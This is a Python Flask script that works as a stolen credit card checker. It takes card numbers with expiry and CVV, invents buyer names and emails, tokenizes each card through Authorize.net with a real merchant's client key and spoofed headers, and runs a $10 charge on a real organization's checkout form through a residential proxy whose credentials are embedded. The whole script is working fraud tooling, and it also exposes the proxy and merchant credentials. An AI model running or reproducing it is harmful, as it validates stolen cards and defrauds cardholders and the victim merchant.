from flask import Flask, request, jsonify
import requests
import uuid
import json
import time
from requests_toolbelt.multipart.encoder import MultipartEncoder
from faker import Faker
import random

app = Flask(__name__)
faker = Faker()

# === Proxy Setup ===
proxy_url = "http://user-PP_NUAE0G7MN3-country-US-plan-luminati:ncgncvqp@bd.porterproxies.com:8888"
proxies = {
    "http": proxy_url,
    "https": proxy_url,
}

def random_name():
    return faker.name()

def random_gmail():
    user = faker.user_name() + str(random.randint(1000, 99999))
    return f"{user}@gmail.com"

def get_token(card, month, year, cvv, zip_code, name):
    url = 'https://api2.authorize.net/xml/v1/request.api'
    headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://nbda.com',
        'Referer': 'https://nbda.com/',
        'User-Agent': 'Mozilla/5.0'
    }
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": "6Wp9xwU7Db",
                "clientKey": "824n5qLwU38rA7Rx7qn3KqceCjkzZYKebp4kLu2WPcxgdPtwedcMxuH5W72aaYx7"
            },
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {
                    "cardNumber": card,
                    "expirationDate": f"{int(month):02d}{year[-2:]}",  # <- zero-padded month!
                    "cardCode": cvv,
                    "zip": zip_code,
                    "fullName": name
                }
            }
        }
    }
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=30)
        r.raise_for_status()
        json_data = json.loads(r.content.decode('utf-8-sig'))
        print("Authorize.net Response:", json_data)  # For debugging
        token = json_data["opaqueData"]["dataValue"]
        return token
    except Exception as e:
        print("[x] Token generation failed:", e)
        if 'r' in locals():
            print("Status:", r.status_code)
            print("Response:", r.text)
        raise Exception(str(e))

def send_to_checkout(token, name, email):
    fields = {
        'nam': name,
        'eml': email,
        'xbs': 'NBDA Shop',
        'xlo': 'New York',
        'crd[nam]': name,
        'crd[ad1]': '123 Main St',
        'crd[zip]': '10080',
        'crd[cot]': 'New York County',
        'crd[sta]': 'NY',
        'crd[con]': 'US',
        'crd[cit]': 'New York',
        'crd[loc][0]': '-74.0156903',
        'crd[loc][1]': '40.7130922',
        'crd[tok]': token,
        'sum': '10',
        'itm[0][_id]': '60b163ea3936fc18ee3b11a9',
        'itm[0][qty]': '1'
    }

    m = MultipartEncoder(fields=fields)
    headers = {
        'Content-Type': m.content_type,
        'Origin': 'https://nbda.com',
        'Referer': 'https://nbda.com/',
        'User-Agent': 'Mozilla/5.0',
        'x-org': '22350'
    }

    try:
        r = requests.post(
            'https://api.membershipworks.com/v2/form/60b161d2b8a6f72e2f5433c6/checkout',
            headers=headers,
            data=m,
            proxies=proxies,
            timeout=180
        )
        try:
            parsed = json.loads(r.text)
            msg = parsed.get("error", "Success")
        except Exception:
            if r.status_code == 200:
                msg = "Success"
            else:
                msg = f"HTTP {r.status_code}"
        return msg
    except Exception as e:
        print("[x] Checkout request failed:", e)
        return str(e)

@app.route('/process', methods=['GET', 'POST'])
def process():
    start_time = time.time()
    cc = request.values.get("cc")

    if not cc:
        return jsonify({"error": "Missing cc parameter"}), 400

    try:
        card, mm, yy, cvv = cc.strip().split("|")
    except Exception as e:
        return jsonify({"error": "Invalid CC format", "detail": str(e)}), 400

    name = random_name()
    email = random_gmail()
    amount = 10

    try:
        token = get_token(card, mm, yy, cvv, "10080", name)
    except Exception as e:
        return jsonify({"error": "Token generation failed", "detail": str(e)}), 500

    message = send_to_checkout(token, name, email)
    time_taken = round(time.time() - start_time, 3)

    return jsonify({
        "amount": amount,
        "time_taken": time_taken,
        "name": name,
        "email": email,
        "message": message
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
